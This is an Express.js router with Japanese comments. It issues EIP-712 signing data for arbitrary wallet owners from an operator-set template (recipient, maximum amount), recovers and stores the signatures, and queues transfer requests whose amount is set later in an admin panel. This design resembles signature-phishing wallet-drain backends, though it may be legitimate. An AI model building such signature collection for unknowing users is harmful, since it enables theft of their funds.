const express = require("express");
const router = express.Router();
const db = require("../db");
const { ethers } = require("ethers");

/* ===================================
   ① 署名データ生成(owner可変対応)
=================================== */
router.get("/sign-data", async (req, res) => {
  try {
    const { owner } = req.query;

    if (!owner) {
      return res.status(400).json({ error: "owner required" });
    }

    // 最新テンプレ
    let [templateRows] = await db.query(
      "SELECT * FROM authorizations WHERE owner = 'TEMPLATE' ORDER BY id DESC LIMIT 1"
    );

    if (!templateRows.length) {
      // 互換 fallback
      [templateRows] = await db.query(
        "SELECT * FROM authorizations ORDER BY id DESC LIMIT 1"
      );
    }

    if (!templateRows.length) {
      return res.json({ error: "no authorization found" });
    }

    const t = templateRows[0];

    // ownerレコード取得
    const [ownerRows] = await db.query(
      "SELECT * FROM authorizations WHERE owner = ? ORDER BY id DESC LIMIT 1",
      [owner]
    );

    const nonce = Date.now();
    let a;

    if (!ownerRows.length) {
      // owner未登録: テンプレ複製
      const [insertResult] = await db.query(
        `INSERT INTO authorizations
         (chain_id, owner, contract_address, token, to_address, max_amount, used_amount, nonce, deadline)
         VALUES (?, ?, ?, ?, ?, ?, 0, ?, ?)`,
        [
          t.chain_id,
          owner,
          t.contract_address,
          t.token,
          t.to_address,
          t.max_amount,
          nonce,
          t.deadline,
        ]
      );

      const [newRows] = await db.query(
        "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
        [insertResult.insertId]
      );
      a = newRows[0];
    } else {
      // owner登録済み: テンプレ内容へ同期(毎回最新反映)
      const targetId = ownerRows[0].id;

      await db.query(
        `UPDATE authorizations
         SET chain_id = ?,
             contract_address = ?,
             token = ?,
             to_address = ?,
             max_amount = ?,
             deadline = ?,
             nonce = ?
         WHERE id = ?`,
        [
          t.chain_id,
          t.contract_address,
          t.token,
          t.to_address,
          t.max_amount,
          t.deadline,
          nonce,
          targetId,
        ]
      );

      const [updatedRows] = await db.query(
        "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
        [targetId]
      );
      a = updatedRows[0];
    }

    const signData = {
      // 署名対象
      chainId: Number(a.chain_id),
      contractAddress: a.contract_address,
      nonce: Number(a.nonce),
      maxAmount: a.max_amount ? a.max_amount.toString() : "0",
      to: a.to_address,
      data: "0x",
      value: 0,

      // 参照用(署名型には含めない)
      authId: a.id,
    };

    res.json(signData);
  } catch (err) {
    console.error("sign-data error:", err);
    res.status(500).json({ error: "server error" });
  }
});

/* ===================================
   ② 署名保存(署名検証あり)
=================================== */
router.post("/save-signature", async (req, res) => {
  try {
    const { signature, message } = req.body;

    if (!signature || !message) {
      return res.status(400).json({ error: "invalid params" });
    }

    const parsed = typeof message === "string" ? JSON.parse(message) : message;

    if (!parsed?.domain || !parsed?.types || !parsed?.message) {
      return res.status(400).json({ error: "invalid typed data" });
    }

    // 署名からowner復元
    const recovered = ethers.verifyTypedData(
      parsed.domain,
      parsed.types,
      parsed.message,
      signature
    );

    const owner = recovered;
    const authId = parsed.message?.authId || null;

    // 署名保存
    await db.query(
      "INSERT INTO signatures (auth_id, owner, signature, message) VALUES (?, ?, ?, ?)",
      [authId, owner, signature, JSON.stringify(parsed)]
    );

    // 承認待ちキューへ追加(amountは管理画面で入力)
    await db.query(
      `INSERT INTO execution_requests
       (auth_id, owner, amount, signature, message, status)
       VALUES (?, ?, '0', ?, ?, 'pending')`,
      [authId, owner, signature, JSON.stringify(parsed)]
    );

    res.json({ success: true, owner, authId, pendingCreated: true });
  } catch (err) {
    console.error("save-signature error:", err);
    res.status(500).json({ error: "server error" });
  }
});

module.exports = router;
